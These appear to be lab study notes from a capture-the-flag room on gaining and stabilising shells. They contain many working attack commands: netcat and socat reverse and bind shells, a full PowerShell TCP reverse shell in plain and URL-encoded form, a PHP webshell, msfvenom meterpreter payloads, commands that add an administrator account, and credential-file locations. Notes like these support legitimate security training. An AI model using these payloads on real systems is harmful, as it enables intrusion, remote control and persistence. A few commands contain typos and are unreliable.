# What the shell?

### Tools

#### Netcat

Pros:
- installed by default on most linux systems
- receive shells and connect to remote ports

Cons:
- unstable by default

#### Socat

Pros:
- shells are more stable than nc
- can do everything nc can and more

Cons:
- Syntax is more difficult
- Very rarely installed by default

#### Metasploit multi/handler

Pros:
- provides a fully-fledged way to obtain stable shells
- wide variety of options to improve the caught shell
- allows access to meterpreter shells
- easiest way to handle staged payloads

Cons:
- ?

#### Msfvenom

Pros:
- generates custom payloads
- extremely flexible

Cons:
- ?

### Types of Shell

#### Reverse shell:

Set up listener on attacking machine then force target to execute code to connecting
back to the attacking machine.

Bypasses firewall rules on target machine but requires configuration on attacking machine's 
network to allow the connection.

Reverse shell example:

listen on attacking machine, send connection from target

Target machine:
`nc <ATTACKER-IP> 443 -e /bin/bash`

Attacking machine:
`sudo nc -lnvp 443`

#### Bind shell:

Execute code on target machine to start a listener attached to a shell directly which opens 
the port to the internet allowing a connection from the attacking machine.

Doesn't require configuration on attacking machine's network but may be prevented by 
firewalls protecting the target.

Bind shell example:

listen on the target, send connection from attacking machine

Target machine:
`nc -lnvp <PORT> -e "cmd.exe"`

Attacking machine:
`nc <TARGET-IP> <PORT>`

#### Interactive shell:

Interactive shells allow you to interact with programs after executing them. For example, 
take the SSH login prompt:

` Are you sure you want to continue connecting(yes/no/[fingerprint])?`

It's asking interactively that the user type either yes or no in order to continue the 
connection. This is an interactive program, which requires an interactive shell in order to 
run.

#### Non-Interactive shell:

 In a non-interactive shell you are limited to using programs which do not require user 
 interaction in order to run properly. Unfortunately, the majority of simple reverse and 
 bind shells are non-interactive.

### Netcat

Reverse Shells

The syntax for starting a netcat listener:

`nc -lvnp <port-number>`

-l is used to tell netcat that this will be a listener
-v is used to request a verbose output
-n tells netcat not to resolve host names or use DNS.
-p indicates that the port specification will follow.

*use sudo for port numbers below 1024*

Bind shells

Syntax to connect:

`nc <TARGET-IP> <PORT>`

### Netcat Shell Stabilisation

#### Python

1. run `python -c 'import pty;pty.spawn("/bin/bash")'` to spawn a better featured shell
2. run `export=TERM=xterm`, giving us access to term commands like `clear`
3. bg the shell using CTRL+Z, run `stty raw -echo; fg` disabling our terminal echo (gives 
us tab autocomplete, arrrow keys and CTRL+C to kill processes) and foregrounding the shell.

#### rlwrap

1. install rlwrap `sudo apt install rlwrap`
2. invoke the listener `rlwrap nc -lnvp <PORT>`
3. if on Linux bg the shell with CTRL+Z and run `stty raw -echo; fg` to stabilise and 
forground the shell.

#### Socat

*limited to Linux targets as Windows shells will remain unstable*

1. transfer a socat static compiled binary using `python3 -m http.server 80` in the dir 
containing the binary
2. run `wget <SERVER-IP>/socat -O /tmp/socat` to download on target machine

Change the size of your reverse/bind shell (use a text editor):

To find size of your terminal run `stty -a` then set rows and columns in reverse/bind shell 
with `stty rows <number>` and `stty cols <number>`

### Socat

#### Reverse shells

Reverse shell listener:

`socat TCP-L:<PORT> -`

Connect back on Windows:

`socat TCP:<ATTACKER-IP>:<PORT> EXEC:powershell.exe,pipes`

*The pipes option forces powershell or cmd to use Unix style standard input and output*

Connect back on Linux:

`socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li"`

*-l makes bash act as if it had been invoked as a login shell, -i makes the shell 
interactive*

#### Bind shells

Socat listener on Linux target:

`socat TCP-L:<PORT> EXEC:"bash -li"`

Socat listener on a Windows target:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

Connect from attacking machine:

`socat TCP:<TARGET-IP>:<PORT> -` 

#### Stabilise Linux shells

Listener syntax (needs socat installed/static binary to connect to):

```socat TCP-L:<PORT> FILE:`tty`,raw,echo=0```

*Equivalent to CTRL+Z `stty raw -echo; fg`*

Command to activate the listener:

`socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

- pty, allocates a pseudoterminal on the target: part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with 
non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill 
commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.

*Add `-d -d` to the command to increase verbosity*

### Socat Encrypted Shells

Replace `TCP` and `TCP-L` with `OPENSSL` and `OPENSSL-LISTEN`

Generate a certificate to use encrypted shells:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This creates a 2086 bit RSA key shell.key, and matching cert file shell.crt, self-signed 
and valid for 362 days.

*may need to increase RSA bit value*

Merge the key and cert files into  a `.pem` file: 

`cat shell.key shell.crt > shell.pem`

#### Reverse shell 

Set up a reverse listener on attacking machine:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

`verify=0` tells socat not to validate our cert is properly signed. The cert must be used 
on the listening device.

To connect back from target:

`socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:/bin/bash`

*check if "bash -li" works*

#### Bind shell

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -`

Special TTY shell listener:

```socat OPENSSL-LISTEN:<PORT>,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0```

Special connect back

`socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Common Shell Payloads

Some versions of netcat allow you to execute a process on the connection with the `-e` tag.
As Windows nearly always needs a static binary this works but on Linux we may have to use 
another method.

Bind shell:

`nc -lnvp <PORT> -e /bin/bash`

Reverse shell:

`nc <TARGET-IP> <PORT> -e /bin/bash`

On Linux we can use this code instead:

Listener for a bind shell:

`mkfifo /tmp/f; nc -lnvp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and 
connects the input of the listener to the output of the named pipe. The output of the 
netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the 
stderr output stream into stdout, and sending stdout itself into the input of the named 
pipe, thus completing the circle.

Listener for a reverse shell:

`mkfifo /tmp/f; nc <ATTACKER-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Powershell reverse shell:

`http://10.10.117.0/uploads/shell-1.php?cmd=powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.7.163',8008);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### msfvenom

Syntax for msfvenom:

`msfvenom -p <PAYLOAD> <OPTIONS>`

Payload naming conventions:

`<os>/<arch>/<payload>`

Stageless:

`linux/x86/shell_reverse_tcp`

`linux/x86/meterpreter_reverse_tcp`

Staged:

`linux/x86/shell/reverse_tcp`

`linux/x86/meterpreter/reverse_tcp`

Windows 32bit:

`windows/shell_reverse_tcp`

### Metasploit multi/handler

Start multi/handler:

`use multi/handler`

Set options:

`set LHOST <listen-address/interface>`

`set PAYLOAD <payload>`

`set LPORT <listen-port>`

Run with `exploit`, add `-j` tag to run in background. 

Interact with `sessions <session-number>`

### Webshells

Colloquial term for a script that runs inside a webserver (ususally in PHP or ASP) which 
executes code on the server.

Basic PHP shell:

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

After upload, execute from URL with `www.site.com/path/to/webshell?cmd=` parameter.

For Windows targets we can use a URL encoded powershell reverse shell as the `cmd` argument.

### Next Steps

After we gain a shell we want to escalate into a normal method for accessing the machine; 
ssh keys, passwords, add our own account etc.

On Windows machines it's possible to find passwords for running services in the registry.
VNC servers frequently leave plaintext passwords in the registry and FIleZilla FTP server
also leave credentials in an XML file:

`C:\Program Files\FileZilla Server\FileZilla Server.xml` or 
`C:\xampp\FileZilla Server\FileZilla Server.xml`

If you obtain a shell running as the SYSTEM user or an admin account you can add your own 
privileged account and log in remotely.

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

### Practice

**1. Upload a webshell to the Linux box and use netcat to send a reverse shell to your 
attacking machine.**

Start listener:

`nc -lnvp <PORT>`

Webshell shell.php:

`<?php "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>` 

Upload to `uploads` folder

Execute with:

`<BOX-IP>/uploads/shell.php?cmd=nc <ATTACKER-IP> <PORT> -e /bin/bash`

**2. Upload `/usr/share/webshells/php/php-reverse-shell.php` from Kali and catch the 
reverse shell on your attacking machine**

Change `$ip` and `$port` in the `php-reverse-shell.php` file to attacking machines ip and 
port you are listening on with netcat.

Set up netcat listener on attacking machine:

`nc -lnvp <PORT>`

Execute with:

`<BOX-IP>/uploads/php-reverse-shell.php`

**3. Log into the Linux box over SSH and use the techniques from [Common Shell Payloads](#
common-shell-payloads) to experiment with bind and reverse netcat shells.**

**Reverse shells**

Target:

`nc <ATTACKER-IP> <PORT> -e /bin/bash`

Attacker:

`nc -lnvp <PORT>`

Target:

`mkfifo /tmp/f; nc <ATTACKER-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Attacker:

`nc -lnvp <PORT>`

**Bind shells**

Target:

`nc -lnvp -e /bin/bash`

Attacker:

`nc <TARGET-IP> <PORT>`

Target:

`mkfifo /tmp/f; nc -lnvp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

**4. Practice reverse and bind shells on the Linux box with Socat.**

**Reverse shells**

Target:

`socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li"`

Attacker:

`socat TCP-L:<PORT> -`

Encrypted 

Target:

`socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:"bash -li"`

Attacker:

`socal OPENSSL-LISTEN:<PORT>,cert=<.PEM-FILE>,verify=0 -`

Stable

Target:

`socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

Attacker:

```socat TCP-L:<PORT> FILE:`tty`,raw,echo=0```

**Bind shells**

Target:

`socat TCP-L:8008 EXEC:"bash -li`

Attacker:

`socat TCP:<TARGET-IP>:<PORT> -`

Encrypted

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=<.PEM-FILE>,verify=0 EXEC:"bash -li"`

Attacker:

`socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -`

Stable

Target:

`socat TCP-L:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

Attacker:

```socat TCP:<TARGET-IP>:<PORT> FILE:`tty`,raw,echo=0```

**5. Look through [Payloads all the things](https://github.com/swisskyrepo/
PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20
Cheatsheet.md) and try some other reverse shell techniques. Analyse them and see why they 
work.**

[Reverse shells here](./reverse-shells.md)

**6. Using the Windows box, try to upload the `php-reverse-shell`. Does this work?**

No, fails with these errors:

```
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 
184
WARNING: Failed to daemonise. This is quite common and not fatal.
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 
184
Successfully opened reverse shell to 10.11.7.163:8008
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 
184
ERROR: Shell process terminated 
```
**7. Upload a webshell and obtain a reverse shell using powershell**

*URL encode your powershell!!!*

upload PHP webshell:

`<?php "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

execute with URL encoded powershell reverse shell as cmd parameter:

`http://<TARGET-IP>/uploads/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<ATACKER-IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`

**8. The webserver is running with SYSTEM privileges. Create a new user and add it to the 
"administrators" group, then login over RDP or WinRM.**

upload webshell and execute with powershell payload

`net user <USERNAME> <PASSWORD> /add`

`net localgroup administrators <USERNAME> /add`

`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.194.169 /u:<USERNAME> 
/p:<PASSWORD>`

**9. Experiment with netcat and socat to obtain bind and reverse shells on the Windows box**

**Bind shells**

Attacker:

`socat TCP:<TARGET-IP>:<PORT> -`

`nc <TARGET-IP> <PORT`

Target:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

`nc -lnvp <PORT> -e powershell.exe`

**Reverse shells**

Atacker:

```socat TCP-L:<PORT> -```

`nc -lnvp 8008`

Target:

`socat TCP:<ATTACKER-IP>:<PORT> EXEC:powershell.exe,pipes`

`nc <ATTACKER-IP> <PORT> -e powershell.exe`

**10. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows 
Target. Activate the shell and catch it with multi/handler. Experiment with the features of 
this shell.**

`msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o shell.exe LHOST=<ATTACKER-IP> LPORT=<PORT>`

Upload payload and webshell to box

Start msfconsole and run `use multi/handler`

Set LHOST and LPORT options to attacker ip and port

run `exploit` to start multi/handler 

Execute payload through webshell

Catch reverse shell with multi/handler

**11. Create both staged and stageless meterpreter shells for either target. Upload and 
manually activate them, catching the shell with netcat: does this work?**

No, meterpreter shells can only be caught with multi/handler
